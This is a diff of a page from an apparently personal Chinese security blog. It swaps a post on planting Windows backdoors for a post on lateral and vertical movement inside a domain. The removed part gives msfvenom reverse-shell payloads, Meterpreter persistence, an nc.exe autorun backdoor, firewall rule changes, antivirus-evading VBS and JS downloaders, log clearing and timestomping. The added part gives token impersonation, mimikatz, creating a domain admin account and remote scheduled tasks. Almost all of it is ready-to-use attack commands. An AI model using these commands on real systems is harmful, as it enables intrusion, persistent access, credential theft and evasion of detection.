@@ -4,11 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="back-door, Broken-year">
-    <meta name="description" content="认识系统后门meterpreter创建系统后门
-创建x64木马
-
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe &amp;">
+    <meta name="keywords" content="域内纵向移动和横向移动, Broken-year">
+    <meta name="description" content="纵向移动和横向移动纵向移动之前已经拿到system权限
+ps    \\查看进程
+migrate 1880  \\把自己进程迁移到1880里
+use incognito
+list_tokens -u   \\可以使用哪些用户
+load mi">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +22,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>back-door | Broken-year</title>
+    <title>域内纵向移动和横向移动 | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -312,12 +314,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">back-door</h1>
+                    <h1 class="description center-align post-title">域内纵向移动和横向移动</h1>
                 </div>
             </div>
         </div>
@@ -431,41 +433,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">网络安全</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%90%8E%E9%97%A8/">
-                                <span class="chip bg-color">后门</span>
-                            </a>
-                        
-                            <a href="/tags/msf/">
-                                <span class="chip bg-color">msf</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">渗透</span>
-                            </a>
-                        
-                            <a href="/tags/windows/">
-                                <span class="chip bg-color">windows</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                网络安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -474,7 +447,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-24
+                    2022-03-31
                 </div>
                 
 
@@ -495,190 +468,62 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="认识系统后门"><a href="#认识系统后门" class="headerlink" title="认识系统后门"></a>认识系统后门</h1><h2 id="meterpreter创建系统后门"><a href="#meterpreter创建系统后门" class="headerlink" title="meterpreter创建系统后门"></a>meterpreter创建系统后门</h2><ol>
-<li>创建x64木马</li>
-</ol>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe &gt; msf.exe
+                <h1 id="纵向移动和横向移动"><a href="#纵向移动和横向移动" class="headerlink" title="纵向移动和横向移动"></a>纵向移动和横向移动</h1><h2 id="纵向移动"><a href="#纵向移动" class="headerlink" title="纵向移动"></a>纵向移动</h2><p>之前已经拿到system权限</p>
+<pre><code>ps    \\查看进程
+migrate 1880  \\把自己进程迁移到1880里
+use incognito
+list_tokens -u   \\可以使用哪些用户
+load mimikatz
+kerberos_ticket_list
+kerberos_ticket_use
 </code></pre>
-<ol start="2">
-<li>生成木马后，放到桌面上。</li>
-</ol>
-<pre><code>use exploit/multi/handler
-set payload windows/metsvc_bind_tcp
-show options
-set lport 192.168.1.120
-exploit
+<p>管理员做过一些事情，但是没有退出</p>
+<p>如果进入域管理员</p>
+<pre><code>getsystem
+impersonate_token TEST1\Administrator  \\提权到域控管理员
+add_user test2 tset123! -h 域控ip
+add_group_user &quot;domain admins&quot; test2 -h 域控ip  \\扔进组里
+shell
+net group &quot;domain admins&quot; /domain
 </code></pre>
-<p>上述木马是运行在内存里的，可以通过关闭进程然后干掉木马。</p>
-<ol start="3">
-<li><strong>通过服务启动</strong>：</li>
-</ol>
-<pre><code>run metsvc -A    # 设定端口上传后门文件
-</code></pre>
-<p>【会开启一个31337端口，然后木马存在于C:\Users\ADMINI~1\APPData\Local\Teemp\FWnOkowKpbzilqs】</p>
-<ol start="4">
-<li><strong>如何利用后门</strong>:</li>
-</ol>
-<pre><code>use exploit/multi/handler
-set payload windows/metsvc_bind_tcp
-set lport 31337
-set rhost [对方的ip]
-exploit
-</code></pre>
-<ol start="5">
-<li><p><strong>或</strong>：<strong>在session中启动利用后门</strong></p>
-<pre><code>run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]
-# 安插一个永久性后门，60s上线一次，使用4321端口
-
-sessions
-# 发现多了一个session6
-
-sessions -i 6
-# 进入session
-
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>入侵了一台普通的域内服务器之后，可以通过一些方法提权到system权限</p>
+<pre><code>ps
+use incognito
+list_tokens -u
+impersonate_token TEST1\\Administrator
 getuid
-getsystem
-getuid
-
-# 然后重启/注销
 </code></pre>
-</li>
-</ol>
-<p>【如果msf关闭了，下次重开】</p>
-<pre><code>use multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lport 4321
-set lhost [自己ip]
-exploit
+<p>通过一些方法知道域的ip地址</p>
+<p>可以映射网络驱动器</p>
+<pre><code>在文件夹里面
+\\域控ip\c$
+通过域控管理员直接连接
 </code></pre>
-<ol start="7">
-<li>重启回来登录后，我们再重开msf，也可以监听。</li>
-<li>即使<code>sessions -k [id] </code>【干掉session id后】，过了60s还会回来</li>
-</ol>
-<h2 id="利用上传文件安插后门："><a href="#利用上传文件安插后门：" class="headerlink" title="利用上传文件安插后门："></a>利用上传文件安插后门：</h2><p>安插木马后</p>
-<p>利用nc：</p>
-<p>进入一个session中：</p>
-<pre><code>upload /root/nc.exe c:\\
+<p>在cmd里</p>
+<pre><code>net use \\域控ip\c$ &quot;test123!&quot; /user:test2
+net share
+net use   建立管道
+dir \\域控ip\c$
+type \\域控ip\c$\this-is-dc.txt
 </code></pre>
-<p>查看注册表里有什么：</p>
-<pre><code>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+<p>当对方开了135和445端口的时候</p>
+<pre><code>net use \\域控ip\ipc$ &quot;test123!&quot; /user:test2
 </code></pre>
-<p>把nc放到自动启动里：</p>
-<pre><code>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;c:\nc.exe -Ldp 444 -e cmd.exe&#39;
+<p>远程访问进程</p>
+<pre><code>tasklist /S 域控ip /U test2 /P test123!
 </code></pre>
-<p>查看代码写的对不对：</p>
-<pre><code>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
-</code></pre>
-<p>查看防火墙状态：</p>
+<p>进入session里面</p>
 <pre><code>shell
-netsh firewall show opmode
+echo &#39;haha&#39; &gt; a.txt
 </code></pre>
-<p>添加一个防火墙规则允许444端口通过：</p>
-<pre><code>sh
-netsh firewall add portopening TCP 444 &quot;FireWall&quot; ENABLE ALL
+<p>然后在cmd里</p>
+<pre><code>copy a.txt \\域控ip\c$
 </code></pre>
-<p>目标主机重启之后：</p>
-<pre><code>nc -v [目标ip] 444
+<p>也可以远程计划任务</p>
+<pre><code>at \\域控ip 9:51PM cmd.exe /c &quot;ipconfig &gt; c:/1.txt&quot;
 </code></pre>
-<p>然后即可连接上。</p>
-<h2 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h2><p>注册表修改的内容可以在msconfig的启动选项卡里看到<br>可以考虑使用自解压的方法进行伪装…</p>
-<p><strong>黑客操作的关键</strong>：利用合法软件去进行操作</p>
-<p><strong>下载的本质</strong>：把对方服务器上所存放的二进制代码原封不动地根据http 协议或其他协议复制到自己的硬盘上。</p>
-<h2 id="使用vbs去远程下载文件"><a href="#使用vbs去远程下载文件" class="headerlink" title="使用vbs去远程下载文件:"></a>使用vbs去远程下载文件:</h2><p>比如在自己网页上创建一个haha.txt文件当作木马。</p>
-<p>创建一个a.vbs：</p>
-<pre><code>set a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
-
-# 创建对象a【&quot;adod&quot;+&quot;b.stream&quot;等同于adodb.stream，拆分是为了免杀】
-# get传输
-# 参数为0
-# 表示下载0，保存到1的地方
-</code></pre>
-<p>cmd运行：</p>
-<pre><code>cscript a.vbs http://www.xx.com/haha.txt c:\b.txt
-cscript a.vbs [参数0：http://www.xx.com/haha.txt] [参数1：c:\b.txt]
-# 下载0保存到1
-</code></pre>
-<p>或cmd使用echo直接写：</p>
-<pre><code>echo set a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; a.vbs
-</code></pre>
-<p>容易被杀毒软件查到</p>
-<h2 id="cmd-certutil下载文件："><a href="#cmd-certutil下载文件：" class="headerlink" title="cmd,certutil下载文件："></a>cmd,certutil下载文件：</h2><pre><code>certutil -urlcache -split -f http://www.xx.com/haha.txt
-
-# 会下载到本目录
-</code></pre>
-<p>有一个弊端：<br>每次下载的时候，都有留存，导致留下入侵痕迹，所以每次下载之后，都要清理痕迹:</p>
-<pre><code>certutil -urlcache -split -f http://www.xx.com/haha.txt delete
-</code></pre>
-<p>除了下载文件还可以校验hash值：</p>
-<pre><code>certutil -hashfile c:\xxx.exe
-</code></pre>
-<p>如果文件被动过，hash值就会改变</p>
-<p>除了下载文件还可以加密解密文件：</p>
-<pre><code>certutil -encode c:\haha.txt c:\haha-en.txt
-certutil -decode c:\haha-en.txt c:\haha-de.txt
-</code></pre>
-<h2 id="使用cmd-bitsadmin下载："><a href="#使用cmd-bitsadmin下载：" class="headerlink" title="使用cmd,bitsadmin下载："></a>使用cmd,bitsadmin下载：</h2><p>下载主命令：</p>
-<pre><code>bitsadmin /rawreturn /transfer down http://www.xx.com/haha.txt c:\haha.txt
-</code></pre>
-<p>提高下载主命令的优先级（下载大型文件）:</p>
-<pre><code>bitsadmin /setpriority down foreground
-</code></pre>
-<h2 id="使用js下载："><a href="#使用js下载：" class="headerlink" title="使用js下载："></a>使用js下载：</h2><p>创建一个a.js</p>
-<pre><code>var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-WinHttpReq.Open(&quot;GET&quot;,WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();  # 发送请求
-WScript.Echo(WinHttpReq.ResponseText);  # 返回
-
-# 然后cmd：
-cscript /nologo a.js http://www.xx.com/haha.txt &gt;&gt; 123.txt
-# 适用于下载脚本
-</code></pre>
-<p>创建一个a.js下载后直接保存为文件:</p>
-<pre><code>var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-WinHttpReq.Open(&quot;GET&quot;,WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();
-BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);
-BinStream.Type = 1;
-BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);
-BinStream.SaveToFile(&quot;abc.exe&quot;);
-
-# cmd：
-cscript /nologo a.js http://www.xx.com/aa.exe
-</code></pre>
-<p>较可靠</p>
-<h2 id="使用ftp脚本"><a href="#使用ftp脚本" class="headerlink" title="使用ftp脚本:"></a>使用ftp脚本:</h2><p>创建一个a.bat</p>
-<pre><code>echo open [黑客ip] &gt; ftp.txt
-echo test&gt;&gt;ftp.txt
-echo 123&gt;&gt;ftp.txt
-echo binary&gt;&gt; ftp.txt
-echo get haha.txt&gt;&gt; ftp.txt
-echo bye &gt;&gt; ftp.txt
-</code></pre>
-<p>创建一个haha.txt</p>
-<pre><code>*CODE:\
-</code></pre>
-<p>双击bat文件会得到一个txt文件。</p>
-<p>然后再cmd里把得到的txt文件内容当作一个脚本去执行：</p>
-<pre><code>ftp -s:ftp.txt
-</code></pre>
-<h2 id="kali的meterpreter其他命令："><a href="#kali的meterpreter其他命令：" class="headerlink" title="kali的meterpreter其他命令："></a>kali的meterpreter其他命令：</h2><pre><code>uictl [enable/disable] [keyboard/mouse/all]   # 开启/停用键盘/鼠标
-
-webcam_list    # 查看摄像头
-webcam_snap    # 通过摄像头拍照
-webcam_stream   # 通过摄像头开启视频
-
-execute    # 在目标上执行文件
-execute -H -i -f [exe文件]    # 创建新的隐藏、可交互的、命令：.exe
-cmd.exe
-execute -H -i -f cmd.exe    # 创建新的隐藏、可交互的、命令：cmd.exe
-
-getpid    # 获取当前进程的pid【进程的id】
-ps     # 查看活跃进程
-migrate [pid]    # 将meterpreter转移到某个pid中[附着]
-kill [pid]     # 杀死某个进程
-
-clearev    # 清除日志，清除windows里的应用程序日志、系统日志、安全日志。但会留下痕迹
-
-timestomp -v c://a.exe    # 查看c盘的a.exe的时间戳
-timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
+<p>如果系统版本比较新</p>
+<pre><code>schtasks /create /s 域控ip /tn test1 /sc onstrat /tr c:/a.bat /ru system / 
 </code></pre>
 
                 
@@ -706,7 +551,7 @@ timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/24/back-door/">http://Broken-year.github.io/2022/03/24/back-door/</a>
+                    <a href="http://Broken-year.github.io/2022/03/31/move/">http://Broken-year.github.io/2022/03/31/move/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -743,27 +588,7 @@ timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">网络安全</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%90%8E%E9%97%A8/">
-                                    <span class="chip bg-color">后门</span>
-                                </a>
-                            
-                                <a href="/tags/msf/">
-                                    <span class="chip bg-color">msf</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">渗透</span>
-                                </a>
-                            
-                                <a href="/tags/windows/">
-                                    <span class="chip bg-color">windows</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -935,82 +760,18 @@ timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/24/android/">
+                <a href="/2022/03/31/move/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="手机木马移动安全以及拒绝服务攻击">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="域内纵向移动和横向移动">
                         
-                        <span class="card-title">手机木马移动安全以及拒绝服务攻击</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-24
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                    网络安全
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/android/">
-                        <span class="chip bg-color">android</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%9C%A8%E9%A9%AC/">
-                        <span class="chip bg-color">木马</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">网络安全</span>
-                    </a>
-                    
-                    <a href="/tags/DDOS/">
-                        <span class="chip bg-color">DDOS</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">
-                        <span class="chip bg-color">拒绝服务攻击</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/03/24/social-engineering/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="社会工程学">
-                        
-                        <span class="card-title">社会工程学</span>
+                        <span class="card-title">域内纵向移动和横向移动</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1021,7 +782,45 @@ timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Broken-year
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/31/uac/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="uac提权和令牌认识">
+                        
+                        <span class="card-title">uac提权和令牌认识</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
                             </span>
                         <span class="publish-author">
                             
@@ -1042,12 +841,20 @@ timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
                         <span class="chip bg-color">网络安全</span>
                     </a>
                     
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9F%9F/">
+                        <span class="chip bg-color">域</span>
+                    </a>
+                    
                     <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
                         <span class="chip bg-color">信息搜集</span>
                     </a>
                     
-                    <a href="/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">
-                        <span class="chip bg-color">社会工程学</span>
+                    <a href="/tags/%E6%8F%90%E6%9D%83/">
+                        <span class="chip bg-color">提权</span>
                     </a>
                     
                 </div>
